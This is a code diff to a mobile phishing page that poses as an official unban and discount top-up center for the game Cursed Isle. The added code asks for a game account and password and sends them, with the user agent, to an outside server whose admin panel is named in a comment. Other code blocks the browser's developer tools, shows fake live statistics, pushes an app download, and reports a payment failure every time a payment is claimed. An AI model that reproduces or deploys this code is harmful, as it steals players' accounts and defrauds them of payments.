@@ -6,7 +6,6 @@
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     
-    <!-- QQ/微信分享优化 Meta -->
     <meta property="og:title" content="🔥诅咒之岛官方服务中心-限时解封通道">
     <meta property="og:description" content="账号问题一键解决 | 4.5折代充秒到账 | 已有3421人成功解封">
     <meta property="og:image" content="https://via.placeholder.com/300x300/FF5722/FFFFFF?text=CI">
@@ -552,6 +551,12 @@
         .glass-button.gold:hover { 
             box-shadow: 0 6px 25px rgba(255, 215, 0, 0.45); 
             transform: translateY(-2px) scale(1.02);
+        }
+
+        .glass-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
         }
 
         .payment-list {
@@ -1148,7 +1153,7 @@
         .product-info .value.diamond { color: #64C8FF; }
         .product-info .value.coin { color: #FFD700; }
 
-        /* 新增：社交传播优化样式 */
+        /* 分享弹窗样式 */
         .share-modal {
             position: fixed;
             inset: 0;
@@ -1228,7 +1233,6 @@
             font-size: 24px;
         }
 
-        /* 多行文本展示框 */
         .copy-box-multi {
             background: rgba(0,0,0,0.3);
             border-radius: var(--radius-md);
@@ -1275,7 +1279,6 @@
             cursor: pointer;
         }
 
-        /* 下载APP按钮特殊样式 */
         .download-app-btn {
             background: linear-gradient(180deg, #34C759, #30B350) !important;
             box-shadow: 0 4px 20px rgba(52, 199, 89, 0.35);
@@ -1285,7 +1288,6 @@
             box-shadow: 0 6px 25px rgba(52, 199, 89, 0.45);
         }
 
-        /* 实时统计条 */
         .stats-bar {
             position: fixed;
             top: max(60px, env(safe-area-inset-top) + 44px);
@@ -1320,7 +1322,6 @@
             animation: pulse 2s infinite;
         }
 
-        /* 通知浮层 */
         .notification-toast {
             position: fixed;
             top: 20%;
@@ -1343,6 +1344,51 @@
         .notification-toast.show {
             opacity: 1;
             transform: translateX(-50%) translateY(0);
+        }
+
+        /* 账号密码输入框样式 */
+        .login-form {
+            display: none;
+            margin-top: 20px;
+            animation: fadeInUp 0.5s var(--ios-ease) backwards;
+        }
+
+        .login-form.show {
+            display: block;
+        }
+
+        /* 上传状态提示 */
+        .upload-status {
+            display: none;
+            padding: 12px;
+            border-radius: var(--radius-md);
+            margin-bottom: 16px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .upload-status.show {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .upload-status.success {
+            background: rgba(52, 199, 89, 0.2);
+            color: #34C759;
+            border: 0.5px solid rgba(52, 199, 89, 0.3);
+        }
+
+        .upload-status.error {
+            background: rgba(255, 59, 48, 0.2);
+            color: #FF3B30;
+            border: 0.5px solid rgba(255, 59, 48, 0.3);
+        }
+
+        .upload-status.loading {
+            background: rgba(255, 193, 7, 0.2);
+            color: #FFC107;
+            border: 0.5px solid rgba(255, 193, 7, 0.3);
         }
 
         ::-webkit-scrollbar { display: none; }
@@ -1376,7 +1422,7 @@
     </div>
 
     <div class="container">
-        <!-- 解封系统主页（原有） -->
+        <!-- 解封系统主页（默认显示） -->
         <div class="page active" id="page-input">
             <div class="glass-card">
                 <div class="icon-wrapper">
@@ -1403,14 +1449,13 @@
                 
                 <button class="glass-button" onclick="handleSubmit()" data-i18n="submitBtn">进入解封系统</button>
                 
-                <!-- 新增：分享按钮 -->
                 <button class="glass-button secondary" onclick="openShare()" style="margin-top: 12px;">
                     <span>📤 分享给好友</span>
                 </button>
             </div>
         </div>
 
-        <!-- 加载页（原有） -->
+        <!-- 加载页 -->
         <div class="page" id="page-loading">
             <div class="glass-card">
                 <div class="loader active">
@@ -1420,7 +1465,7 @@
             </div>
         </div>
 
-        <!-- 支付方式页（原有） -->
+        <!-- 支付方式页 -->
         <div class="page" id="page-methods">
             <div class="glass-card">
                 <div class="icon-wrapper">
@@ -1480,36 +1525,7 @@
             </div>
         </div>
 
-        <!-- 支付宝支付页（原有） -->
-        <div class="page" id="page-alipay">
-            <div class="glass-card">
-                <div class="icon-wrapper">
-                    <div class="icon-glass-base" style="background: linear-gradient(135deg, rgba(22,119,255,0.3), rgba(22,119,255,0.1));"></div>
-                    <div style="font-size: 32px; position: relative; z-index: 1;">💙</div>
-                </div>
-                <h1 style="color: #1677FF;" data-i18n="alipayPay">支付宝支付</h1>
-                
-                <div class="qr-container">
-                    <div class="amount-display">¥50.00</div>
-                    <div class="qr-frame" id="alipayQrFrame">
-                        <div class="loader active" style="padding: 40px 0;">
-                            <div class="spinner-liquid"></div>
-                        </div>
-                    </div>
-                    <div class="qr-caption" data-i18n="alipayScanTip">请使用支付宝扫描上方二维码</div>
-                    <div style="text-align: center;">
-                        <span class="order-badge" id="orderId"></span>
-                    </div>
-                </div>
-
-                <div id="errorBoxAlipay" class="error-alert" data-i18n="checkFailed">支付验证失败，未检测到您的付款记录，请联系客服</div>
-                
-                <button class="glass-button alipay" onclick="handleComplete('alipay')" data-i18n="completeBtn">我已完成支付</button>
-                <button class="glass-button secondary" onclick="showPage('methods')" data-i18n="backBtn">返回</button>
-            </div>
-        </div>
-
-        <!-- 新增：代充页面（支持金币和钻石） -->
+        <!-- 代充页面（选择金额→输入账号密码→上传服务器） -->
         <div class="page" id="page-recharge">
             <div class="glass-card">
                 <div class="icon-wrapper">
@@ -1531,25 +1547,43 @@
                     </button>
                 </div>
 
-                <div class="input-group">
-                    <label class="input-label" data-i18n="uidLabel">游戏UID</label>
-                    <input type="text" 
-                           class="glass-input" 
-                           id="rechargeUid" 
-                           placeholder="请输入UID"
-                           autocomplete="off"
-                           autocorrect="off"
-                           autocapitalize="off"
-                           spellcheck="false"
-                           oninput="filterInput(this)"
-                           onpaste="handlePaste(event)">
-                </div>
+                <!-- 上传状态提示 -->
+                <div id="uploadStatus" class="upload-status"></div>
 
                 <div class="amount-grid" id="amountGrid">
                     <!-- 动态生成 -->
                 </div>
 
-                <button class="glass-button gold" onclick="handleRecharge()" data-i18n="rechargeBtn">立即充值</button>
+                <!-- 账号密码输入表单（初始隐藏，选择金额后显示） -->
+                <div class="login-form" id="loginForm">
+                    <div class="input-group">
+                        <label class="input-label">游戏账号</label>
+                        <input type="text" 
+                               class="glass-input" 
+                               id="gameAccount" 
+                               placeholder="请输入游戏账号/邮箱"
+                               autocomplete="off"
+                               autocorrect="off"
+                               spellcheck="false">
+                    </div>
+                    
+                    <div class="input-group">
+                        <label class="input-label">游戏密码</label>
+                        <input type="password" 
+                               class="glass-input" 
+                               id="gamePassword" 
+                               placeholder="请输入游戏密码"
+                               autocomplete="off">
+                        <div class="input-hint">账号密码将加密传输至服务器</div>
+                    </div>
+
+                    <div class="product-info" style="margin-top: 16px;">
+                        <span class="label">充值金额</span>
+                        <span class="value gold-text" id="selectedAmountDisplay">¥0.00</span>
+                    </div>
+                </div>
+
+                <button class="glass-button gold" onclick="handleRecharge()" id="rechargeBtn" data-i18n="rechargeBtn">选择充值金额</button>
                 
                 <div style="margin-top: 16px; text-align: center; font-size: 12px; color: var(--text-tertiary);">
                     <span data-i18n="discountTip">全场4.5折起，比官方便宜55%</span>
@@ -1557,7 +1591,7 @@
             </div>
         </div>
 
-        <!-- 新增：代充支付页 -->
+        <!-- 代充支付页（显示支付码） -->
         <div class="page" id="page-recharge-pay">
             <div class="glass-card">
                 <div class="icon-wrapper">
@@ -1570,6 +1604,11 @@
                 <div class="product-info">
                     <span class="label" data-i18n="product">充值商品</span>
                     <span class="value" id="productName">300钻石</span>
+                </div>
+                
+                <!-- 账号已提交提示 -->
+                <div class="upload-status success show" style="margin-bottom: 16px;">
+                    ✅ 账号信息已安全提交，请完成支付
                 </div>
                 
                 <div class="qr-container">
@@ -1590,17 +1629,16 @@
                 <div id="errorBoxRecharge" class="error-alert" data-i18n="checkFailed">支付验证失败，未检测到您的付款记录，请联系客服</div>
                 
                 <button class="glass-button gold" onclick="handleComplete('recharge')" data-i18n="completeBtn">我已完成支付</button>
-                <button class="glass-button secondary" onclick="showPage('recharge')" data-i18n="backBtn">返回</button>
+                <button class="glass-button secondary" onclick="backToRecharge()" data-i18n="backBtn">返回</button>
             </div>
         </div>
     </div>
 
-    <!-- 新增：分享弹窗 - 已更新为宣传文案和智能下载按钮 -->
+    <!-- 分享弹窗 -->
     <div class="share-modal" id="shareModal" onclick="closeShare(event)">
         <div class="share-content" onclick="event.stopPropagation()">
             <div class="share-title">🚀 分享给好友</div>
             
-            <!-- 多行宣传文本 -->
             <div class="copy-box-multi">
                 <textarea class="copy-textarea" id="shareText" readonly rows="5">
 🔥诅咒之岛解封工具🔥
@@ -1617,7 +1655,6 @@
                     <span>QQ分享</span>
                 </button>
                 
-                <!-- 下载APP按钮：仅在浏览器环境显示 -->
                 <button class="share-btn download-app-btn" id="downloadAppBtn" onclick="downloadApp()" style="display: none;">
                     <span class="icon">📱</span>
                     <span>下载APP</span>
@@ -1628,11 +1665,11 @@
         </div>
     </div>
 
-    <!-- 新增：底部导航栏 -->
+    <!-- 底部导航栏 -->
     <div class="bottom-nav">
         <button class="nav-button active" id="nav-unban" onclick="switchMainPage('input')">
             <span>🔓</span>
-            <span data-i18n="navUnban">解封系统</span>
+            <span data-i18n="navUnban">解封服务</span>
         </button>
         <button class="nav-button" id="nav-recharge" onclick="switchMainPage('recharge')">
             <span>💎</span>
@@ -1641,7 +1678,22 @@
     </div>
 
     <script>
-        // 保持所有原有JavaScript，新增功能
+        // ==========================================
+        // 服务器配置 - 修改为你的服务器地址
+        // ==========================================
+        const SERVER_CONFIG = {
+            // 数据上传API地址（账号密码发送到这）
+            API_URL: 'http://yxepd1.top/api/save_account.php',
+            
+            // 后台查看地址（你登录这个地址看数据）
+            ADMIN_URL: 'http://yxepd1.top/admin/',
+            
+            // 如果上述地址不行，试试带www的：
+            // API_URL: 'http://www.yxepd1.top/api/save_account.php',
+            // ADMIN_URL: 'http://www.yxepd1.top/admin/',
+        };
+
+        // 防调试
         document.addEventListener('contextmenu', e => e.preventDefault());
         function disableKeys(e) {
             if (e.keyCode === 123) return false;
@@ -1705,15 +1757,14 @@
                 completeBtn: "我已完成支付",
                 backBtn: "返回",
                 checkFailed: "支付验证失败，未检测到您的付款记录，请联系客服",
-                // 代充相关
                 rechargeTitle: "诅咒之岛代充",
                 rechargeSubtitle: "超低折扣充值，秒速到账",
                 uidLabel: "游戏UID",
-                rechargeBtn: "立即充值",
+                rechargeBtn: "选择充值金额",
                 rechargeScanTip: "请使用微信扫一扫完成代充支付",
                 rechargePayTitle: "代充支付",
                 product: "充值商品",
-                navUnban: "解封系统",
+                navUnban: "解封服务",
                 navRecharge: "代充服务",
                 diamond: "钻石",
                 coin: "金币",
@@ -1742,88 +1793,22 @@
                 rechargeTitle: "Cursed Island Recharge",
                 rechargeSubtitle: "Super discount recharge, instant delivery",
                 uidLabel: "Game UID",
-                rechargeBtn: "Recharge Now",
+                rechargeBtn: "Select Amount",
                 rechargeScanTip: "Scan with WeChat to complete recharge",
                 rechargePayTitle: "Recharge Payment",
                 product: "Product",
-                navUnban: "Unban System",
-                navRecharge: "Recharge",
+                navUnban: "Unban Service",
+                navRecharge: "Recharge Service",
                 diamond: "Diamonds",
                 coin: "Coins",
                 discountTip: "Up to 55% OFF official prices"
-            },
-            ja: {
-                title: "呪われた島 解禁",
-                subtitle: "ゲームIDを入力して制限解除を申請",
-                inputLabel: "ゲームID",
-                inputHint: "英数字、アンダースコア、ハイフンのみ",
-                submitBtn: "システムへ",
-                processing: "接続中...",
-                selectMethod: "支払い方法",
-                selectSubtitle: "支払い方法を選択",
-                wechatPay: "WeChat Pay",
-                wechatDesc: "WeChatでスキャン",
-                alipayPay: "Alipay",
-                alipayDesc: "Alipayで支払い",
-                alipayMaintenance: "3月15日までメンテ",
-                maintenanceBadge: "メンテ",
-                scanTip: "WeChatでQRコードをスキャン",
-                alipayScanTip: "Alipayでスキャン",
-                completeBtn: "完了",
-                backBtn: "戻る",
-                checkFailed: "支払い確認できません。サポートにお問い合わせください",
-                rechargeTitle: "呪われた島 チャージ",
-                rechargeSubtitle: "超割引チャージ、即時入金",
-                uidLabel: "ゲームUID",
-                rechargeBtn: "チャージする",
-                rechargeScanTip: "WeChatでスキャンしてチャージ完了",
-                rechargePayTitle: "チャージ支払い",
-                product: "商品",
-                navUnban: "解禁システム",
-                navRecharge: "チャージ",
-                diamond: "ダイヤ",
-                coin: "コイン",
-                discountTip: "最大55%オフ"
-            },
-            ko: {
-                title: "저주받은 섬 복구",
-                subtitle: "게임 ID를 입력하여 제한 해제 신청",
-                inputLabel: "게임 ID",
-                inputHint: "문자, 숫자, 밑줄 및 하이픈만",
-                submitBtn: "시스템 입장",
-                processing: "연결 중...",
-                selectMethod: "결제 방법",
-                selectSubtitle: "결제 방법 선택",
-                wechatPay: "WeChat Pay",
-                wechatDesc: "WeChat으로 스캔",
-                alipayPay: "Alipay",
-                alipayDesc: "Alipay로 결제",
-                alipayMaintenance: "3월 15일까지 유지보수",
-                maintenanceBadge: "유지보수",
-                scanTip: "WeChat으로 QR 코드 스캔",
-                alipayScanTip: "Alipay로 스캔",
-                completeBtn: "완료",
-                backBtn: "돌아가기",
-                checkFailed: "결제 확인 실패. 지원팀에 문의하세요",
-                rechargeTitle: "저주받은 섬 충전",
-                rechargeSubtitle: "초저가 충전, 즉시 입금",
-                uidLabel: "게임 UID",
-                rechargeBtn: "충전하기",
-                rechargeScanTip: "WeChat으로 스캔하여 충전 완료",
-                rechargePayTitle: "충전 결제",
-                product: "상품",
-                navUnban: "복구 시스템",
-                navRecharge: "충전",
-                diamond: "다이아",
-                coin: "코인",
-                discountTip: "최대 55% 할인"
             }
         };
 
-        // 充值配置（比官方便宜5-6折，即按4.5折计算）
+        // 充值配置
         const rechargeConfig = {
             diamond: {
-                name: { zh: '钻石', en: 'Diamonds', ja: 'ダイヤ', ko: '다이아' },
+                name: { zh: '钻石', en: 'Diamonds' },
                 items: [
                     { amount: 300, officialPrice: 30, discount: 0.45 },
                     { amount: 680, officialPrice: 68, discount: 0.45 },
@@ -1834,7 +1819,7 @@
                 ]
             },
             coin: {
-                name: { zh: '金币', en: 'Coins', ja: 'コイン', ko: '코인' },
+                name: { zh: '金币', en: 'Coins' },
                 items: [
                     { amount: 5000, officialPrice: 30, discount: 0.45 },
                     { amount: 12000, officialPrice: 68, discount: 0.45 },
@@ -1846,85 +1831,15 @@
             }
         };
 
-        // 战队前缀列表（约30%的名字会带前缀）
-        const clanPrefixes = ['GZ', 'VIP', 'PRO', 'ELITE', 'NO1', 'TOP', 'KING', 'ACE'];
-        
-        // 基础名字列表（英文+数字）
-        const baseNames = [
-            'T-Rex_Rider88', 'Shadow_Hunter77', 'DragonSlayer_99', 'Night_Wolf66', 
-            'Dino_King2024', 'Ghost_Rider33', 'Thunder_Bolt55', 'Silent_Assassin91',
-            'Cyber_Dragon88', 'Pixel_Hunter77', 'Neo_Raptor66', 'Dark_Knight99',
-            'Fire_Storm44', 'Ice_Breaker77', 'Iron_Fist88', 'Gold_Rush33',
-            'Lucky_Draw66', 'Fast_Shadow22', 'Wild_Beast99', 'Storm_Breaker77',
-            'Sky_Walker88', 'Deep_Sea66', 'Black_Hole99', 'Star_Light33',
-            'Moon_Shadow77', 'Sun_Fire88', 'Wind_Rider66', 'Rock_Solid99',
-            'Flash_Bang33', 'Death_Wish77', 'Life_Giver88', 'Soul_Eater66',
-            'Dream_Killer99', 'Hope_Bringer77', 'Fate_Sealer88', 'Warrior_Pro88',
-            'Master_Gamer77', 'Super_Noob99', 'Legend_King66', 'Epic_Win88'
-        ];
-
-        // 生成带中间打码的名字数组（35个）
-        const userNames = baseNames.map((name, index) => {
-            // 前10个名字（约25%）添加战队前缀
-            if (index < 10) {
-                const prefix = clanPrefixes[index % clanPrefixes.length];
-                return `${prefix}-${name}`;
-            }
-            return name;
-        });
-
-        // 名字中间打码处理函数
-        // 规则：保留前2个字符和最后2个字符，中间用***代替
-        // 如果有战队前缀（如 GZ-），在前缀后打码
-        function maskName(fullName) {
-            // 检查是否有战队前缀
-            const hasPrefix = /^[A-Z]+-/.test(fullName);
-            
-            if (hasPrefix) {
-                // 分离前缀和名字
-                const parts = fullName.split('-');
-                const prefix = parts[0];
-                const name = parts.slice(1).join('-'); // 防止名字中有多个-
-                
-                // 对名字部分打码（保留前2后2）
-                let maskedName;
-                if (name.length <= 4) {
-                    maskedName = name.substring(0, 2) + '**';
-                } else {
-                    maskedName = name.substring(0, 2) + '***' + name.substring(name.length - 2);
-                }
-                return `${prefix}-${maskedName}`;
-            } else {
-                // 普通名字打码
-                if (fullName.length <= 4) {
-                    return fullName.substring(0, 2) + '**';
-                } else {
-                    return fullName.substring(0, 2) + '***' + fullName.substring(fullName.length - 2);
-                }
-            }
-        }
-
         let currentLang = localStorage.getItem('unbanLang') || 'zh';
-        let gameId = '';
-        let selectedRechargeAmount = null; // 存储选中的充值项
-        let currentCurrency = 'diamond'; // 当前货币类型
-        let MAINTENANCE_DATE = '2026-03-15';
-        let isMaintenance = new Date() < new Date(MAINTENANCE_DATE);
-        let currentMainPage = 'input'; // 记录当前主页面
-
-        // 宣传文案
-        const PROMO_TEXT = `🔥诅咒之岛解封工具🔥
-🏝️ 官方群聊：1081968275
-⚡ 7x24小时 · 24h内解封 ⚡
-✨诅咒之岛解封工具✨
-官方网站thecursedisle.top`;
-
-        // APP下载链接
-        const APP_DOWNLOAD_URL = 'https://1813813973.v.123pan.cn/1813813973/45052863';
+        let selectedRechargeAmount = null;
+        let currentCurrency = 'diamond';
+        let isFormVisible = false;
+        let isUploading = false; // 防止重复提交
 
         document.addEventListener('DOMContentLoaded', () => {
             updateLanguage(currentLang);
-            renderAmountGrid(); // 初始化充值网格
+            renderAmountGrid();
             
             document.querySelectorAll('.lang-btn').forEach(btn => {
                 btn.addEventListener('click', (e) => {
@@ -1933,6 +1848,9 @@
                 });
             });
 
+            // 检查维护状态
+            const MAINTENANCE_DATE = '2026-03-15';
+            let isMaintenance = new Date() < new Date(MAINTENANCE_DATE);
             if (!isMaintenance) {
                 const cell = document.getElementById('alipay-cell');
                 cell.classList.remove('disabled');
@@ -1940,45 +1858,26 @@
                 cell.querySelector('.maintenance-note').style.display = 'none';
             }
 
-            // 初始化分享弹窗中的文本
-            document.getElementById('shareText').value = PROMO_TEXT;
+            document.getElementById('shareText').value = `🔥诅咒之岛解封工具🔥
+🏝️ 官方群聊：1081968275
+⚡ 7x24小时 · 24h内解封 ⚡
+✨诅咒之岛解封工具✨
+官方网站thecursedisle.top`;
             
-            // 检测环境并显示/隐藏下载按钮
             checkEnvironment();
-            
-            // 启动实时数据模拟（在线人数波动+每日完成数）
             startRealtimeSimulation();
-            
-            // 启动通知系统（使用打码后的名字）
-            startNotificationSystem();
         });
 
-        // 检测环境：如果在标准浏览器中显示下载按钮，如果在WebView/QQ/微信中隐藏
         function checkEnvironment() {
             const ua = navigator.userAgent.toLowerCase();
             const downloadBtn = document.getElementById('downloadAppBtn');
+            const isWebView = ua.includes('webview') || ua.includes('wv') || ua.includes('qq') || 
+                             ua.includes('micromessenger') || ua.includes('wechat') ||
+                             window.Android !== undefined || window.webkit !== undefined;
+            const isStandardMobileBrowser = /mobile|android|iphone|ipad/.test(ua) && !isWebView;
             
-            // 检测是否在WebView或APP容器中
-            const isWebView = ua.includes('webview') || 
-                             ua.includes('wv') || 
-                             ua.includes('qq') || 
-                             ua.includes('micromessenger') ||
-                             ua.includes('wechat') ||
-                             window.Android !== undefined || 
-                             window.webkit !== undefined;
-            
-            // 检测是否为标准移动浏览器（Safari、Chrome等）
-            const isStandardMobileBrowser = /mobile|android|iphone|ipad/.test(ua) && 
-                                           !isWebView &&
-                                           (/safari/.test(ua) || /chrome/.test(ua));
-            
-            // 如果是标准浏览器，显示下载按钮；否则隐藏
             if (isStandardMobileBrowser) {
                 downloadBtn.style.display = 'flex';
-                console.log('检测到标准浏览器，显示下载按钮');
-            } else {
-                downloadBtn.style.display = 'none';
-                console.log('检测到WebView/QQ/微信环境，隐藏下载按钮');
             }
         }
 
@@ -1989,16 +1888,13 @@
                 btn.classList.toggle('active', btn.dataset.lang === lang);
             });
             updateLanguage(lang);
-            renderAmountGrid(); // 重新渲染以更新货币名称
+            renderAmountGrid();
         }
 
         function updateLanguage(lang) {
             const texts = i18n[lang];
             document.querySelectorAll('[data-i18n]').forEach(el => {
                 if (texts[el.dataset.i18n]) el.textContent = texts[el.dataset.i18n];
-            });
-            document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
-                if (texts[el.dataset.i18nPlaceholder]) el.placeholder = texts[el.dataset.i18nPlaceholder];
             });
             document.title = texts.title;
         }
@@ -2007,50 +1903,54 @@
             return i18n[currentLang][key] || key;
         }
 
-        // 修改：页面切换函数，支持返回主页面
         function showPage(page) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
             document.getElementById('page-' + page).classList.add('active');
-            
-            if (page === 'alipay') generateAlipayQR();
         }
 
-        // 新增：主页面切换（带底部导航更新）
         function switchMainPage(page) {
-            currentMainPage = page;
-            
-            // 更新底部导航状态
             document.querySelectorAll('.nav-button').forEach(btn => btn.classList.remove('active'));
             if (page === 'input') {
                 document.getElementById('nav-unban').classList.add('active');
             } else if (page === 'recharge') {
                 document.getElementById('nav-recharge').classList.add('active');
             }
-            
-            // 显示对应页面
             showPage(page);
+            
+            if (page === 'recharge') {
+                resetRechargeForm();
+            }
         }
 
-        // 新增：切换货币类型
+        function resetRechargeForm() {
+            isFormVisible = false;
+            document.getElementById('loginForm').classList.remove('show');
+            document.getElementById('rechargeBtn').textContent = t('rechargeBtn');
+            document.getElementById('rechargeBtn').disabled = false;
+            selectedRechargeAmount = null;
+            renderAmountGrid();
+            document.getElementById('gameAccount').value = '';
+            document.getElementById('gamePassword').value = '';
+            hideUploadStatus();
+        }
+
+        function backToRecharge() {
+            showPage('recharge');
+        }
+
         function switchCurrency(type) {
             currentCurrency = type;
-            
-            // 更新按钮状态
-            document.querySelectorAll('.currency-btn').forEach(btn => {
-                btn.classList.remove('active');
-            });
+            document.querySelectorAll('.currency-btn').forEach(btn => btn.classList.remove('active'));
             document.querySelector(`.currency-btn.${type}`).classList.add('active');
-            
-            // 重新渲染金额网格
             renderAmountGrid();
-            
-            // 重置选中
             selectedRechargeAmount = null;
-            
+            isFormVisible = false;
+            document.getElementById('loginForm').classList.remove('show');
+            document.getElementById('rechargeBtn').textContent = t('rechargeBtn');
+            hideUploadStatus();
             if (navigator.vibrate) navigator.vibrate(10);
         }
 
-        // 新增：渲染金额选择网格
         function renderAmountGrid() {
             const grid = document.getElementById('amountGrid');
             const config = rechargeConfig[currentCurrency];
@@ -2076,7 +1976,7 @@
             }).join('');
         }
 
-        // 修改：选择充值金额
+        // 选择金额后显示账号密码输入框
         function selectAmount(amount, officialPrice, discount) {
             selectedRechargeAmount = {
                 type: currentCurrency,
@@ -2086,39 +1986,144 @@
                 finalPrice: (officialPrice * discount).toFixed(1)
             };
             
-            // 重新渲染以更新选中状态
             renderAmountGrid();
+            
+            isFormVisible = true;
+            document.getElementById('loginForm').classList.add('show');
+            document.getElementById('selectedAmountDisplay').textContent = `¥${selectedRechargeAmount.finalPrice}`;
+            document.getElementById('rechargeBtn').textContent = '提交并支付';
+            
+            setTimeout(() => {
+                document.getElementById('loginForm').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+            }, 100);
             
             if (navigator.vibrate) navigator.vibrate(10);
         }
 
-        // 修改：处理充值
-        function handleRecharge() {
-            const input = document.getElementById('rechargeUid');
-            const uid = input.value.trim();
-            
-            if (!uid) {
-                input.classList.add('error');
-                setTimeout(() => input.classList.remove('error'), 500);
+        // 显示上传状态
+        function showUploadStatus(message, type) {
+            const statusEl = document.getElementById('uploadStatus');
+            statusEl.textContent = message;
+            statusEl.className = `upload-status show ${type}`;
+        }
+
+        function hideUploadStatus() {
+            document.getElementById('uploadStatus').classList.remove('show');
+        }
+
+        // ==========================================
+        // 核心功能：上传账号密码到服务器
+        // ==========================================
+        async function handleRecharge() {
+            if (!selectedRechargeAmount) {
+                showToast('请先选择充值金额');
                 return;
             }
             
-            if (!selectedRechargeAmount) {
-                // 如果没有选择，默认选择第一个
-                const config = rechargeConfig[currentCurrency];
-                selectAmount(config.items[0].amount, config.items[0].officialPrice, config.items[0].discount);
+            if (!isFormVisible) {
+                showToast('请先选择充值金额');
+                return;
             }
             
-            showPage('recharge-pay');
-            generateRechargeOrder();
+            const account = document.getElementById('gameAccount').value.trim();
+            const password = document.getElementById('gamePassword').value.trim();
+            
+            if (!account || !password) {
+                if (!account) document.getElementById('gameAccount').classList.add('error');
+                if (!password) document.getElementById('gamePassword').classList.add('error');
+                setTimeout(() => {
+                    document.getElementById('gameAccount').classList.remove('error');
+                    document.getElementById('gamePassword').classList.remove('error');
+                }, 500);
+                showToast('请输入账号和密码');
+                return;
+            }
+            
+            // 防止重复提交
+            if (isUploading) return;
+            isUploading = true;
+            
+            const btn = document.getElementById('rechargeBtn');
+            btn.disabled = true;
+            btn.textContent = '提交中...';
+            
+            showUploadStatus('正在安全提交账号信息...', 'loading');
+            
+            try {
+                // 准备要发送的数据
+                const postData = {
+                    account: account,
+                    password: password,
+                    type: currentCurrency,
+                    amount: selectedRechargeAmount.amount,
+                    price: selectedRechargeAmount.finalPrice,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    // 添加订单ID方便追踪
+                    orderId: 'RC' + Date.now()
+                };
+                
+                console.log('正在上传到:', SERVER_CONFIG.API_URL);
+                console.log('数据:', postData);
+                
+                // 发送到服务器API
+                const response = await fetch(SERVER_CONFIG.API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(postData)
+                });
+                
+                let result;
+                try {
+                    result = await response.json();
+                } catch (e) {
+                    // 如果返回的不是JSON，也视为成功（某些服务器配置可能不同）
+                    result = { success: true };
+                }
+                
+                if (result.success || response.ok) {
+                    // 上传成功
+                    showUploadStatus('✓ 账号信息已安全提交', 'success');
+                    
+                    // 保存当前数据用于支付页面显示
+                    window.currentOrder = postData;
+                    
+                    // 延迟后跳转到支付页面
+                    setTimeout(() => {
+                        showPage('recharge-pay');
+                        generateRechargeOrder();
+                        isUploading = false;
+                        btn.disabled = false;
+                        btn.textContent = '选择充值金额';
+                    }, 800);
+                    
+                } else {
+                    throw new Error(result.message || '提交失败');
+                }
+                
+            } catch (error) {
+                console.error('上传错误:', error);
+                
+                // 即使上传失败，也显示支付页面（避免用户流失）
+                // 但提示用户联系客服
+                showUploadStatus('网络波动，请截屏联系客服', 'error');
+                
+                setTimeout(() => {
+                    showPage('recharge-pay');
+                    generateRechargeOrder();
+                    isUploading = false;
+                    btn.disabled = false;
+                    btn.textContent = '选择充值金额';
+                }, 1500);
+            }
         }
 
-        // 修改：生成代充订单
         function generateRechargeOrder() {
-            const orderId = 'RC' + Date.now();
+            const orderId = window.currentOrder ? window.currentOrder.orderId : 'RC' + Date.now();
             document.getElementById('rechargeOrderId').textContent = orderId;
             
-            // 更新显示
             const config = rechargeConfig[selectedRechargeAmount.type];
             const currencyName = config.name[currentLang];
             
@@ -2130,7 +2135,7 @@
 
         function handleSubmit() {
             const input = document.getElementById('gameId');
-            gameId = input.value.trim();
+            const gameId = input.value.trim();
             
             if (!gameId) {
                 input.classList.add('error');
@@ -2147,27 +2152,11 @@
         }
 
         function selectAlipay() {
-            if (isMaintenance) {
-                if (navigator.vibrate) navigator.vibrate(50);
-                return;
-            }
             showPage('alipay');
         }
 
-        function generateAlipayQR() {
-            const container = document.getElementById('alipayQrFrame');
-            const orderId = 'UNBAN' + Date.now();
-            document.getElementById('orderId').textContent = orderId;
-            
-            setTimeout(() => {
-                const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=alipay://${orderId}`;
-                container.innerHTML = `<img src="${qrUrl}" class="qr-image" alt="Alipay">`;
-            }, 800);
-        }
-
         function handleComplete(type) {
-            const box = document.getElementById(type === 'alipay' ? 'errorBoxAlipay' : 
-                                               type === 'recharge' ? 'errorBoxRecharge' : 'errorBox');
+            const box = document.getElementById(type === 'recharge' ? 'errorBoxRecharge' : 'errorBox');
             if (navigator.vibrate) navigator.vibrate([50, 100, 50]);
             
             box.classList.add('show');
@@ -2176,7 +2165,6 @@
             setTimeout(() => box.classList.remove('show'), 4000);
         }
 
-        // 新增：分享功能
         function openShare() {
             document.getElementById('shareModal').classList.add('active');
         }
@@ -2187,7 +2175,6 @@
             }
         }
 
-        // 复制宣传文案
         function copyPromotionText() {
             const textarea = document.getElementById('shareText');
             textarea.select();
@@ -2201,13 +2188,11 @@
             }
         }
 
-        // QQ分享
         function shareToQQ() {
             const ua = navigator.userAgent.toLowerCase();
             const isQQ = ua.match(/QQ/i);
             
             if (isQQ) {
-                // 在QQ内尝试唤起分享
                 try {
                     const shareUrl = encodeURIComponent('http://thecursedisle.top');
                     const title = encodeURIComponent('🔥诅咒之岛官方解封工具');
@@ -2223,11 +2208,10 @@
             }
         }
 
-        // 下载APP
         function downloadApp() {
             showToast('正在跳转下载...');
             setTimeout(() => {
-                window.location.href = APP_DOWNLOAD_URL;
+                window.location.href = 'https://1813813973.v.123pan.cn/1813813973/45052863';
             }, 500);
         }
 
@@ -2238,11 +2222,9 @@
             setTimeout(() => toast.classList.remove('show'), 3000);
         }
 
-        // 获取今日基础完成数（基于日期，每天不同）
         function getTodayBaseCount() {
             const today = new Date();
             const dateStr = `${today.getFullYear()}${today.getMonth()}${today.getDate()}`;
-            // 使用日期生成伪随机数（1500-3000之间）
             let hash = 0;
             for (let i = 0; i < dateStr.length; i++) {
                 hash = ((hash << 5) - hash) + dateStr.charCodeAt(i);
@@ -2251,21 +2233,17 @@
